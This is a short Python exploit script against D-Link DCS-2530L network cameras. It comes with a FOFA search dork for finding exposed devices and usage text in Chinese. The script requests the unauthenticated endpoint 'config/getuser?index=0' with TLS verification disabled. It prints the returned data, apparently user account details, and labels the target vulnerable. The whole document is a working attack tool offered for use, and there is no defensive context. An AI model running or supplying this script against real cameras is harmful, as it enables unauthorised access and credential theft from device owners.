#!/usr/bin/python3
#Author 陈tua
#fofa dork: app="D_Link-DCS-2530L"
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

if sys.argv[1]=='-h':
	print("使用方式: python3 exp.py -t url");
	print("示例:python3 exp.py -t https:192.168.1.1/");
	exit();

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

if sys.argv[1]=='-t':
	tagurl=sys.argv[2]
	url=tagurl+"config/getuser?index=0"
	headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
            }
	re=requests.get(url,headers = headers,verify = False,timeout = 5)
	if re.status_code==200:
		print("[+]Target is vuln!")
		print(re.text)
	else:
		print("[-]Target is not vuln!")